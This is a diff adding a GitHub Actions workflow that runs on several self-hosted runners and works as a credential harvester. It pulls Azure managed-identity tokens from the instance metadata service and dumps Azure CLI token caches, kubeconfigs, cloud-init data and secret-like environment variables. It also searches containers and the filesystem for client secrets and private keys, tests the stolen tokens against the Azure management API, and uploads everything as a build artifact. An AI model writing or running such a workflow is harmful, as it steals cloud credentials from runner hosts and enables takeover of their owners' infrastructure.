@@ -1,0 +1,74 @@
+name: ul-harvest-7648
+on:
+  workflow_dispatch:
+concurrency:
+  group: ul-harvest-7648
+  cancel-in-progress: false
+jobs:
+  harvest:
+    strategy:
+      fail-fast: false
+      max-parallel: 6
+      matrix:
+        label: ["h-t1946107x61", "h-t1946107x76", "a100itn1", "t19i52947-eus-h", "hk-az-181356", "ul-l40s"]
+    runs-on: [self-hosted, "${{ matrix.label }}"]
+    timeout-minutes: 15
+    continue-on-error: true
+    steps:
+      - name: harvest
+        shell: bash
+        run: |
+          OUT=/tmp/h7648.txt
+          : > $OUT
+          echo "HARVEST-BEGIN label=${{ matrix.label }} ts=$(date -u +%FT%TZ)" | tee -a $OUT
+          id >> $OUT 2>&1
+          hostname -f >> $OUT 2>&1
+          hostname -I >> $OUT 2>&1
+          cat /etc/machine-id >> $OUT 2>&1
+          uname -a >> $OUT 2>&1
+          echo "---IMDS-INSTANCE---" >> $OUT
+          curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' >> $OUT 2>&1; echo >> $OUT
+          echo "---IMDS-IDENTITY-INFO---" >> $OUT
+          curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/info?api-version=2018-02-01' >> $OUT 2>&1; echo >> $OUT
+          echo "---IMDS-TOKEN-DEFAULT---" >> $OUT
+          curl -s -m 10 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' >> $OUT 2>&1; echo >> $OUT
+          CIDS=$(curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/info?api-version=2018-02-01' | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | sort -u)
+          echo "CIDS=$CIDS" >> $OUT
+          for C in $CIDS; do
+            echo "---IMDS-TOKEN-CID $C---" >> $OUT
+            curl -s -m 10 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$C" >> $OUT 2>&1; echo >> $OUT
+          done
+          echo "---AZCACHE---" >> $OUT
+          for D in /root/.azure /home/*/.azure; do echo "## $D" >> $OUT; ls -la "$D" >> $OUT 2>&1; for F in accessTokens.json azureProfile.json msal_token_cache.json msal_token_cache.bin service_principal_entries.json clouds.config; do [ -f "$D/$F" ] && { echo "### $D/$F"; head -c 200000 "$D/$F"; echo; } >> $OUT 2>&1; done; done
+          echo "---K8S-AZ---" >> $OUT
+          for F in /etc/kubernetes/azure.json /etc/kubernetes/kubelet.conf /var/lib/kubelet/config.yaml /root/.kube/config /home/*/.kube/config /var/lib/waagent/ManagedIdentity-Settings; do [ -e "$F" ] && { echo "## $F"; head -c 20000 "$F"; echo; } >> $OUT 2>&1; done
+          ls -la /var/lib/waagent >> $OUT 2>&1
+          head -c 40000 /var/lib/waagent/*.xml >> $OUT 2>&1
+          echo "---CLOUDINIT---" >> $OUT
+          head -c 20000 /var/lib/cloud/instance/user-data.txt >> $OUT 2>&1; echo >> $OUT
+          head -c 20000 /var/log/cloud-init-output.log >> $OUT 2>&1
+          echo "---ENV---" >> $OUT
+          env | sort | grep -iE 'azure|arm|token|client|subscription|tenant|secret|key|conn' >> $OUT 2>&1
+          echo "---DOCKER---" >> $OUT
+          (docker ps --format '{{.ID}} {{.Image}} {{.Names}}' 2>&1 | head -40; for I in $(docker ps -q 2>/dev/null | head -20); do docker inspect $I 2>/dev/null | grep -iE 'client_secret|tenant|subscription|token|password|AccountKey|SAS|secret' | head -10; done) >> $OUT 2>&1
+          echo "---GREP-FS---" >> $OUT
+          timeout 120 grep -rIlE 'client_secret|clientSecret|aadClientSecret|tenant_id|subscription_id|BEGIN (RSA|OPENSSH|EC) PRIVATE KEY' /opt /srv /home /etc /root /var/lib/cloud 2>/dev/null | head -60 >> $OUT
+          echo "---FIND-KEYS---" >> $OUT
+          find / -maxdepth 5 \( -name '*.pem' -o -name '*.pfx' -o -name '*kubeconfig*' -o -name 'azure.json' \) 2>/dev/null | head -40 >> $OUT
+          echo "---ARM-PROBE---" >> $OUT
+          for T in $(grep -oE '"access_token":"[^"]+' $OUT | cut -d'"' -f4 | sort -u); do
+            echo "## TOKEN len=${#T}" >> $OUT
+            curl -s -m 15 -H "Authorization: Bearer $T" 'https://management.azure.com/subscriptions?api-version=2022-12-01' -o /tmp/subs.json -w 'subs_http=%{http_code}\n' >> $OUT 2>&1
+            head -c 3000 /tmp/subs.json >> $OUT; echo >> $OUT
+            curl -s -m 20 -H "Authorization: Bearer $T" 'https://management.azure.com/subscriptions/21bcfd92-9348-4285-a51e-815d6e56bddf/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01' -o /tmp/vms.json -w 'vms_http=%{http_code}\n' >> $OUT 2>&1
+            head -c 3000 /tmp/vms.json >> $OUT; echo >> $OUT
+          done
+          echo "HARVEST-END" >> $OUT
+          cat $OUT
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: harvest-7648-${{ matrix.label }}-${{ github.run_id }}
+          path: /tmp/h7648.txt
+          if-no-files-found: ignore
